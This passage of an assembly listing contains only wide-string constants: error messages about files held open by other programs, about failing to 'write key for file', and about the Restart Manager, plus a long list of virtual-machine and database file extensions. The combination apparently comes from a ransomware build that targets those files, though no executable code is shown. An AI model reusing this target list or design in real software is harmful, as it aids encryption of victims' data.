	DB	' ', 00H, 'i', 00H, 's', 00H, ' ', 00H, 'a', 00H, 'l', 00H, 'r'
	DB	00H, 'e', 00H, 'a', 00H, 'd', 00H, 'y', 00H, ' ', 00H, 'o', 00H
	DB	'p', 00H, 'e', 00H, 'n', 00H, ' ', 00H, 'b', 00H, 'y', 00H, ' '
	DB	00H, 'a', 00H, 'n', 00H, 'o', 00H, 't', 00H, 'h', 00H, 'e', 00H
	DB	'r', 00H, ' ', 00H, 'p', 00H, 'r', 00H, 'o', 00H, 'g', 00H, 'r'
	DB	00H, 'a', 00H, 'm', 00H, '.', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1GA@FDHIJDFN@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAw?$AAr?$AAi?$AAt?$AAe?$AA?5?$AAk?$AAe?$AAy@
CONST	SEGMENT
??_C@_1GA@FDHIJDFN@?$AAC?$AAa?$AAn?$AA?8?$AAt?$AA?5?$AAw?$AAr?$AAi?$AAt?$AAe?$AA?5?$AAk?$AAe?$AAy@ DB 'C'
	DB	00H, 'a', 00H, 'n', 00H, '''', 00H, 't', 00H, ' ', 00H, 'w', 00H
	DB	'r', 00H, 'i', 00H, 't', 00H, 'e', 00H, ' ', 00H, 'k', 00H, 'e'
	DB	00H, 'y', 00H, ' ', 00H, 'f', 00H, 'o', 00H, 'r', 00H, ' ', 00H
	DB	'f', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ' ', 00H, '%', 00H, 's'
	DB	00H, '.', 00H, ' ', 00H, 'G', 00H, 'e', 00H, 't', 00H, 'L', 00H
	DB	'a', 00H, 's', 00H, 't', 00H, 'E', 00H, 'r', 00H, 'r', 00H, 'o'
	DB	00H, 'r', 00H, ' ', 00H, '=', 00H, ' ', 00H, '%', 00H, 'l', 00H
	DB	'u', 00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1DI@LNFEJEN@?$AAR?$AAe?$AAs?$AAt?$AAa?$AAr?$AAt?$AA?5?$AAm?$AAa?$AAn?$AAa?$AAg?$AAe?$AAr@
CONST	SEGMENT
??_C@_1DI@LNFEJEN@?$AAR?$AAe?$AAs?$AAt?$AAa?$AAr?$AAt?$AA?5?$AAm?$AAa?$AAn?$AAa?$AAg?$AAe?$AAr@ DB 'R'
	DB	00H, 'e', 00H, 's', 00H, 't', 00H, 'a', 00H, 'r', 00H, 't', 00H
	DB	' ', 00H, 'm', 00H, 'a', 00H, 'n', 00H, 'a', 00H, 'g', 00H, 'e'
	DB	00H, 'r', 00H, ' ', 00H, 'n', 00H, 'o', 00H, 't', 00H, ' ', 00H
	DB	'l', 00H, 'o', 00H, 'a', 00H, 'd', 00H, 'e', 00H, 'd', 00H, '.'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19GMLGIHEA@?$AA?4?$AAi?$AAs?$AAo@
CONST	SEGMENT
??_C@_19GMLGIHEA@?$AA?4?$AAi?$AAs?$AAo@ DB '.', 00H, 'i', 00H, 's', 00H, 'o'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@OFHIIEEE@?$AA?4?$AAv?$AAm?$AAc?$AAx@
CONST	SEGMENT
??_C@_1M@OFHIIEEE@?$AA?4?$AAv?$AAm?$AAc?$AAx@ DB '.', 00H, 'v', 00H, 'm', 00H
	DB	'c', 00H, 'x', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@BMNOADBA@?$AA?4?$AAa?$AAv?$AAd?$AAx@
CONST	SEGMENT
??_C@_1M@BMNOADBA@?$AA?4?$AAa?$AAv?$AAd?$AAx@ DB '.', 00H, 'a', 00H, 'v', 00H
	DB	'd', 00H, 'x', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@LAJNLKJI@?$AA?4?$AAv?$AAh?$AAd?$AAx@
CONST	SEGMENT
??_C@_1M@LAJNLKJI@?$AA?4?$AAv?$AAh?$AAd?$AAx@ DB '.', 00H, 'v', 00H, 'h', 00H
	DB	'd', 00H, 'x', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@PKPDNCHL@?$AA?4?$AAv?$AAm?$AAr?$AAs@
CONST	SEGMENT
??_C@_1M@PKPDNCHL@?$AA?4?$AAv?$AAm?$AAr?$AAs@ DB '.', 00H, 'v', 00H, 'm', 00H
	DB	'r', 00H, 's', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@HBNDCLEM@?$AA?4?$AAa?$AAv?$AAh?$AAd@
CONST	SEGMENT
??_C@_1M@HBNDCLEM@?$AA?4?$AAa?$AAv?$AAh?$AAd@ DB '.', 00H, 'a', 00H, 'v', 00H
	DB	'h', 00H, 'd', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19OEDMLMNC@?$AA?4?$AAv?$AAs?$AAv@
CONST	SEGMENT
??_C@_19OEDMLMNC@?$AA?4?$AAv?$AAs?$AAv@ DB '.', 00H, 'v', 00H, 's', 00H, 'v'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19CLCNNNIO@?$AA?4?$AAb?$AAi?$AAn@
CONST	SEGMENT
??_C@_19CLCNNNIO@?$AA?4?$AAb?$AAi?$AAn@ DB '.', 00H, 'b', 00H, 'i', 00H, 'n'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@DJGBOAGI@?$AA?4?$AAs?$AAu?$AAb?$AAv?$AAo?$AAl@
CONST	SEGMENT
??_C@_1BA@DJGBOAGI@?$AA?4?$AAs?$AAu?$AAb?$AAv?$AAo?$AAl@ DB '.', 00H, 's', 00H
	DB	'u', 00H, 'b', 00H, 'v', 00H, 'o', 00H, 'l', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@OIEKGGMM@?$AA?4?$AAq?$AAc?$AAo?$AAw?$AA2@
CONST	SEGMENT
??_C@_1O@OIEKGGMM@?$AA?4?$AAq?$AAc?$AAo?$AAw?$AA2@ DB '.', 00H, 'q', 00H, 'c'
	DB	00H, 'o', 00H, 'w', 00H, '2', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19JGNEHGNN@?$AA?4?$AAr?$AAa?$AAw@
CONST	SEGMENT
??_C@_19JGNEHGNN@?$AA?4?$AAr?$AAa?$AAw@ DB '.', 00H, 'r', 00H, 'a', 00H, 'w'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DNDPKIAK@?$AA?4?$AAv?$AAm?$AAx@
CONST	SEGMENT
??_C@_19DNDPKIAK@?$AA?4?$AAv?$AAm?$AAx@ DB '.', 00H, 'v', 00H, 'm', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@PGBOIEGF@?$AA?4?$AAn?$AAv?$AAr?$AAa?$AAm@
CONST	SEGMENT
??_C@_1O@PGBOIEGF@?$AA?4?$AAn?$AAv?$AAr?$AAa?$AAm@ DB '.', 00H, 'n', 00H, 'v'
	DB	00H, 'r', 00H, 'a', 00H, 'm', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@PMGBGOPI@?$AA?4?$AAv?$AAm?$AAs?$AAd@
CONST	SEGMENT
??_C@_1M@PMGBGOPI@?$AA?4?$AAv?$AAm?$AAs?$AAd@ DB '.', 00H, 'v', 00H, 'm', 00H
	DB	's', 00H, 'd', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@JDNMIOJM@?$AA?4?$AAv?$AAm?$AAs?$AAn@
CONST	SEGMENT
??_C@_1M@JDNMIOJM@?$AA?4?$AAv?$AAm?$AAs?$AAn@ DB '.', 00H, 'v', 00H, 'm', 00H
	DB	's', 00H, 'n', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@FEOGMAPE@?$AA?4?$AAv?$AAm?$AAe?$AAm@
CONST	SEGMENT
??_C@_1M@FEOGMAPE@?$AA?4?$AAv?$AAm?$AAe?$AAm@ DB '.', 00H, 'v', 00H, 'm', 00H
	DB	'e', 00H, 'm', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19PFIGPEHI@?$AA?4?$AAp?$AAv?$AAm@
CONST	SEGMENT
??_C@_19PFIGPEHI@?$AA?4?$AAp?$AAv?$AAm@ DB '.', 00H, 'p', 00H, 'v', 00H, 'm'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@LKNBEMIN@?$AA?4?$AAv?$AAm?$AAd?$AAk@
CONST	SEGMENT
??_C@_1M@LKNBEMIN@?$AA?4?$AAv?$AAm?$AAd?$AAk@ DB '.', 00H, 'v', 00H, 'm', 00H
	DB	'd', 00H, 'k', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19HHDNNBJO@?$AA?4?$AAv?$AAh?$AAd@
CONST	SEGMENT
??_C@_19HHDNNBJO@?$AA?4?$AAv?$AAh?$AAd@ DB '.', 00H, 'v', 00H, 'h', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19PCJFMJDI@?$AA?4?$AAv?$AAd?$AAi@
CONST	SEGMENT
??_C@_19PCJFMJDI@?$AA?4?$AAv?$AAd?$AAi@ DB '.', 00H, 'v', 00H, 'd', 00H, 'i'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HBDHGLAH@?$AA?4?$AAm?$AAd?$AAt@
CONST	SEGMENT
??_C@_19HBDHGLAH@?$AA?4?$AAm?$AAd?$AAt@ DB '.', 00H, 'm', 00H, 'd', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19EOJDNMPM@?$AA?4?$AAm?$AAd?$AAn@
CONST	SEGMENT
??_C@_19EOJDNMPM@?$AA?4?$AAm?$AAd?$AAn@ DB '.', 00H, 'm', 00H, 'd', 00H, 'n'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DDEPFFFK@?$AA?4?$AAm?$AAa?$AAw@
CONST	SEGMENT
??_C@_19DDEPFFFK@?$AA?4?$AAm?$AAa?$AAw@ DB '.', 00H, 'm', 00H, 'a', 00H, 'w'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HFBHLKKH@?$AA?4?$AAl?$AAu?$AAt@
CONST	SEGMENT
??_C@_19HFBHLKKH@?$AA?4?$AAl?$AAu?$AAt@ DB '.', 00H, 'l', 00H, 'u', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19MNBDAKJJ@?$AA?4?$AAi?$AAc?$AAr@
CONST	SEGMENT
??_C@_19MNBDAKJJ@?$AA?4?$AAi?$AAc?$AAr@ DB '.', 00H, 'i', 00H, 'c', 00H, 'r'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19KKNEKNDE@?$AA?4?$AAi?$AAc?$AAg@
CONST	SEGMENT
??_C@_19KKNEKNDE@?$AA?4?$AAi?$AAc?$AAg@ DB '.', 00H, 'i', 00H, 'c', 00H, 'g'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DNNAEBD@?$AA?4?$AAh?$AAj?$AAt@
CONST	SEGMENT
??_C@_19DNNAEBD@?$AA?4?$AAh?$AAj?$AAt@ DB '.', 00H, 'h', 00H, 'j', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19CIPKBJMB@?$AA?4?$AAf?$AAm?$AA5@
CONST	SEGMENT
??_C@_19CIPKBJMB@?$AA?4?$AAf?$AAm?$AA5@ DB '.', 00H, 'f', 00H, 'm', 00H, '5'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19GFOJENA@?$AA?4?$AAd?$AAb?$AA2@
CONST	SEGMENT
??_C@_19GFOJENA@?$AA?4?$AAd?$AAb?$AA2@ DB '.', 00H, 'd', 00H, 'b', 00H, '2'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BJDMMJLD@?$AA?4?$AAa?$AAd?$AAn@
CONST	SEGMENT
??_C@_19BJDMMJLD@?$AA?4?$AAa?$AAd?$AAn@ DB '.', 00H, 'a', 00H, 'd', 00H, 'n'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@JKHFEGEF@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAw@
CONST	SEGMENT
??_C@_1O@JKHFEGEF@?$AA?4?$AAa?$AAc?$AAc?$AAd?$AAw@ DB '.', 00H, 'a', 00H, 'c'
	DB	00H, 'c', 00H, 'd', 00H, 'w', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19LKBHCCON@?$AA?4?$AAa?$AAb?$AAx@
CONST	SEGMENT
??_C@_19LKBHCCON@?$AA?4?$AAa?$AAb?$AAx@ DB '.', 00H, 'a', 00H, 'b', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19GNBGKFOM@?$AA?4?$AAa?$AAb?$AAs@
CONST	SEGMENT
??_C@_19GNBGKFOM@?$AA?4?$AAa?$AAb?$AAs@ DB '.', 00H, 'a', 00H, 'b', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@JNHJMGEC@?$AA?4?$AAa?$AAb?$AAc?$AAd?$AAd?$AAb@
CONST	SEGMENT
??_C@_1BA@JNHJMGEC@?$AA?4?$AAa?$AAb?$AAc?$AAd?$AAd?$AAb@ DB '.', 00H, 'a', 00H
	DB	'b', 00H, 'c', 00H, 'd', 00H, 'd', 00H, 'b', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1O@GJEACCMG@?$AA?4?$AAx?$AAm?$AAl?$AAf?$AAf@
CONST	SEGMENT
??_C@_1O@GJEACCMG@?$AA?4?$AAx?$AAm?$AAl?$AAf?$AAf@ DB '.', 00H, 'x', 00H, 'm'
	DB	00H, 'l', 00H, 'f', 00H, 'f', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19PJCGIBLK@?$AA?4?$AAx?$AAl?$AAd@
CONST	SEGMENT
??_C@_19PJCGIBLK@?$AA?4?$AAx?$AAl?$AAd@ DB '.', 00H, 'x', 00H, 'l', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DABOFMAL@?$AA?4?$AAx?$AAd?$AAb@
CONST	SEGMENT
??_C@_19DABOFMAL@?$AA?4?$AAx?$AAd?$AAb@ DB '.', 00H, 'x', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19EBLJOAKL@?$AA?4?$AAw?$AAr?$AAk@
CONST	SEGMENT
??_C@_19EBLJOAKL@?$AA?4?$AAw?$AAr?$AAk@ DB '.', 00H, 'w', 00H, 'r', 00H, 'k'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@CIBLGIDJ@?$AA?4?$AAw?$AAm?$AAd?$AAb@
CONST	SEGMENT
??_C@_1M@CIBLGIDJ@?$AA?4?$AAw?$AAm?$AAd?$AAb@ DB '.', 00H, 'w', 00H, 'm', 00H
	DB	'd', 00H, 'b', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19OJDOEOKH@?$AA?4?$AAw?$AAd?$AAb@
CONST	SEGMENT
??_C@_19OJDOEOKH@?$AA?4?$AAw?$AAd?$AAb@ DB '.', 00H, 'w', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LEPBCNGB@?$AA?4?$AAv?$AAv?$AAv@
CONST	SEGMENT
??_C@_19LEPBCNGB@?$AA?4?$AAv?$AAv?$AAv@ DB '.', 00H, 'v', 00H, 'v', 00H, 'v'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19JILIFBGI@?$AA?4?$AAv?$AAp?$AAd@
CONST	SEGMENT
??_C@_19JILIFBGI@?$AA?4?$AAv?$AAp?$AAd@ DB '.', 00H, 'v', 00H, 'p', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HBKPGNBN@?$AA?4?$AAv?$AAi?$AAs@
CONST	SEGMENT
??_C@_19HBKPGNBN@?$AA?4?$AAv?$AAi?$AAs@ DB '.', 00H, 'v', 00H, 'i', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LCNKNINP@?$AA?4?$AAv?$AA1?$AA2@
CONST	SEGMENT
??_C@_19LCNKNINP@?$AA?4?$AAv?$AA1?$AA2@ DB '.', 00H, 'v', 00H, '1', 00H, '2'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19OFNBCMGG@?$AA?4?$AAu?$AAs?$AAr@
CONST	SEGMENT
??_C@_19OFNBCMGG@?$AA?4?$AAu?$AAs?$AAr@ DB '.', 00H, 'u', 00H, 's', 00H, 'r'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19ELMEDOOJ@?$AA?4?$AAu?$AAd?$AAl@
CONST	SEGMENT
??_C@_19ELMEDOOJ@?$AA?4?$AAu?$AAd?$AAl@ DB '.', 00H, 'u', 00H, 'd', 00H, 'l'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19KLBLEJNK@?$AA?4?$AAu?$AAd?$AAb@
CONST	SEGMENT
??_C@_19KLBLEJNK@?$AA?4?$AAu?$AAd?$AAb@ DB '.', 00H, 'u', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19OKFNLIJE@?$AA?4?$AAt?$AAr?$AAm@
CONST	SEGMENT
??_C@_19OKFNLIJE@?$AA?4?$AAt?$AAr?$AAm@ DB '.', 00H, 't', 00H, 'r', 00H, 'm'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19KICMPKH@?$AA?4?$AAt?$AAr?$AAc@
CONST	SEGMENT
??_C@_19KICMPKH@?$AA?4?$AAt?$AAr?$AAc@ DB '.', 00H, 't', 00H, 'r', 00H, 'c'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BHFDDJDD@?$AA?4?$AAt?$AAp?$AAs@
CONST	SEGMENT
??_C@_19BHFDDJDD@?$AA?4?$AAt?$AAp?$AAs@ DB '.', 00H, 't', 00H, 'p', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19GFNFEHFA@?$AA?4?$AAt?$AAm?$AAd@
CONST	SEGMENT
??_C@_19GFNFEHFA@?$AA?4?$AAt?$AAm?$AAd@ DB '.', 00H, 't', 00H, 'm', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@IGCCOLM@?$AA?4?$AAt?$AAe?$AAm?$AAx@
CONST	SEGMENT
??_C@_1M@IGCCOLM@?$AA?4?$AAt?$AAe?$AAm?$AAx@ DB '.', 00H, 't', 00H, 'e', 00H
	DB	'm', 00H, 'x', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_17OKGKBIBE@?$AA?4?$AAt?$AAe@
CONST	SEGMENT
??_C@_17OKGKBIBE@?$AA?4?$AAt?$AAe@ DB '.', 00H, 't', 00H, 'e', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BE@NHPOKFNI@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe?$AAd?$AAb@
CONST	SEGMENT
??_C@_1BE@NHPOKFNI@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe?$AAd?$AAb@ DB '.', 00H
	DB	's', 00H, 'q', 00H, 'l', 00H, 'i', 00H, 't', 00H, 'e', 00H, 'd'
	DB	00H, 'b', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_1BC@MPFGJHCM@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe?$AA3@
CONST	SEGMENT
??_C@_1BC@MPFGJHCM@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe?$AA3@ DB '.', 00H
	DB	's', 00H, 'q', 00H, 'l', 00H, 'i', 00H, 't', 00H, 'e', 00H, '3'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@JFCMHFPB@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe@
CONST	SEGMENT
??_C@_1BA@JFCMHFPB@?$AA?4?$AAs?$AAq?$AAl?$AAi?$AAt?$AAe@ DB '.', 00H, 's', 00H
	DB	'q', 00H, 'l', 00H, 'i', 00H, 't', 00H, 'e', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_19NOLAKEEG@?$AA?4?$AAs?$AAq?$AAl@
CONST	SEGMENT
??_C@_19NOLAKEEG@?$AA?4?$AAs?$AAq?$AAl@ DB '.', 00H, 's', 00H, 'q', 00H, 'l'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LHJPPIKB@?$AA?4?$AAs?$AAp?$AAq@
CONST	SEGMENT
??_C@_19LHJPPIKB@?$AA?4?$AAs?$AAp?$AAq@ DB '.', 00H, 's', 00H, 'p', 00H, 'q'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DJEPGDHJ@?$AA?4?$AAs?$AAi?$AAs@
CONST	SEGMENT
??_C@_19DJEPGDHJ@?$AA?4?$AAs?$AAi?$AAs@ DB '.', 00H, 's', 00H, 'i', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19OCBGNHAK@?$AA?4?$AAs?$AAd?$AAf@
CONST	SEGMENT
??_C@_19OCBGNHAK@?$AA?4?$AAs?$AAd?$AAf@ DB '.', 00H, 's', 00H, 'd', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19NFMICHDI@?$AA?4?$AAs?$AAd?$AAc@
CONST	SEGMENT
??_C@_19NFMICHDI@?$AA?4?$AAs?$AAd?$AAc@ DB '.', 00H, 's', 00H, 'd', 00H, 'c'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19GNHEEAFN@?$AA?4?$AAs?$AAd?$AAb@
CONST	SEGMENT
??_C@_19GNHEEAFN@?$AA?4?$AAs?$AAd?$AAb@ DB '.', 00H, 's', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19EPNFMHBO@?$AA?4?$AAs?$AAc?$AAx@
CONST	SEGMENT
??_C@_19EPNFMHBO@?$AA?4?$AAs?$AAc?$AAx@ DB '.', 00H, 's', 00H, 'c', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DEEPDEBH@?$AA?4?$AAs?$AAb?$AAf@
CONST	SEGMENT
??_C@_19DEEPDEBH@?$AA?4?$AAs?$AAb?$AAf@ DB '.', 00H, 's', 00H, 'b', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BE@BHBAPCAP@?$AA?4?$AAs?$AAa?$AAs?$AA7?$AAb?$AAd?$AAa?$AAt@
CONST	SEGMENT
??_C@_1BE@BHBAPCAP@?$AA?4?$AAs?$AAa?$AAs?$AA7?$AAb?$AAd?$AAa?$AAt@ DB '.', 00H
	DB	's', 00H, 'a', 00H, 's', 00H, '7', 00H, 'b', 00H, 'd', 00H, 'a'
	DB	00H, 't', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19JKGGCNDM@?$AA?4?$AAr?$AAs?$AAd@
CONST	SEGMENT
??_C@_19JKGGCNDM@?$AA?4?$AAr?$AAs?$AAd@ DB '.', 00H, 'r', 00H, 's', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BMPCFPJC@?$AA?4?$AAr?$AAp?$AAd@
CONST	SEGMENT
??_C@_19BMPCFPJC@?$AA?4?$AAr?$AAp?$AAd@ DB '.', 00H, 'r', 00H, 'p', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@LDLDBDPL@?$AA?4?$AAr?$AAo?$AAd?$AAx@
CONST	SEGMENT
??_C@_1M@LDLDBDPL@?$AA?4?$AAr?$AAo?$AAd?$AAx@ DB '.', 00H, 'r', 00H, 'o', 00H
	DB	'd', 00H, 'x', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19OOHCOPNM@?$AA?4?$AAr?$AAo?$AAd@
CONST	SEGMENT
??_C@_19OOHCOPNM@?$AA?4?$AAr?$AAo?$AAd@ DB '.', 00H, 'r', 00H, 'o', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@PNAFOMAI@?$AA?4?$AAr?$AAc?$AAt?$AAd@
CONST	SEGMENT
??_C@_1M@PNAFOMAI@?$AA?4?$AAr?$AAc?$AAt?$AAd@ DB '.', 00H, 'r', 00H, 'c', 00H
	DB	't', 00H, 'd', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19PIOFDEIJ@?$AA?4?$AAr?$AAb?$AAf@
CONST	SEGMENT
??_C@_19PIOFDEIJ@?$AA?4?$AAr?$AAb?$AAf@ DB '.', 00H, 'r', 00H, 'b', 00H, 'f'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19EECELLGM@?$AA?4?$AAq?$AAv?$AAd@
CONST	SEGMENT
??_C@_19EECELLGM@?$AA?4?$AAq?$AAv?$AAd@ DB '.', 00H, 'q', 00H, 'v', 00H, 'd'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HNMGHGDI@?$AA?4?$AAq?$AAr?$AAy@
CONST	SEGMENT
??_C@_19HNMGHGDI@?$AA?4?$AAq?$AAr?$AAy@ DB '.', 00H, 'q', 00H, 'r', 00H, 'y'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19NHMNBLKI@?$AA?4?$AAp?$AAn?$AAz@
CONST	SEGMENT
??_C@_19NHMNBLKI@?$AA?4?$AAp?$AAn?$AAz@ DB '.', 00H, 'p', 00H, 'n', 00H, 'z'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19LLJIFHOI@?$AA?4?$AAp?$AAd?$AAm@
CONST	SEGMENT
??_C@_19LLJIFHOI@?$AA?4?$AAp?$AAd?$AAm@ DB '.', 00H, 'p', 00H, 'd', 00H, 'm'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19ODPLEHLO@?$AA?4?$AAp?$AAd?$AAb@
CONST	SEGMENT
??_C@_19ODPLEHLO@?$AA?4?$AAp?$AAd?$AAb@ DB '.', 00H, 'p', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19PJOAGJLF@?$AA?4?$AAp?$AAa?$AAn@
CONST	SEGMENT
??_C@_19PJOAGJLF@?$AA?4?$AAp?$AAa?$AAn@ DB '.', 00H, 'p', 00H, 'a', 00H, 'n'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19KPDIKDAH@?$AA?4?$AAp?$AA9?$AA7@
CONST	SEGMENT
??_C@_19KPDIKDAH@?$AA?4?$AAp?$AA9?$AA7@ DB '.', 00H, 'p', 00H, '9', 00H, '7'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BHIEMEGC@?$AA?4?$AAp?$AA9?$AA6@
CONST	SEGMENT
??_C@_19BHIEMEGC@?$AA?4?$AAp?$AA9?$AA6@ DB '.', 00H, 'p', 00H, '9', 00H, '6'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19HLJOHDGJ@?$AA?4?$AAo?$AAw?$AAc@
CONST	SEGMENT
??_C@_19HLJOHDGJ@?$AA?4?$AAo?$AAw?$AAc@ DB '.', 00H, 'o', 00H, 'w', 00H, 'c'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19KMELDCEE@?$AA?4?$AAo?$AAr?$AAx@
CONST	SEGMENT
??_C@_19KMELDCEE@?$AA?4?$AAo?$AAr?$AAx@ DB '.', 00H, 'o', 00H, 'r', 00H, 'x'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19JCGDCHIP@?$AA?4?$AAo?$AAq?$AAy@
CONST	SEGMENT
??_C@_19JCGDCHIP@?$AA?4?$AAo?$AAq?$AAy@ DB '.', 00H, 'o', 00H, 'q', 00H, 'y'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19EGGAGEDJ@?$AA?4?$AAo?$AAd?$AAb@
CONST	SEGMENT
??_C@_19EGGAGEDJ@?$AA?4?$AAo?$AAd?$AAb@ DB '.', 00H, 'o', 00H, 'd', 00H, 'b'
	DB	00H, 00H, 00H				; `string'
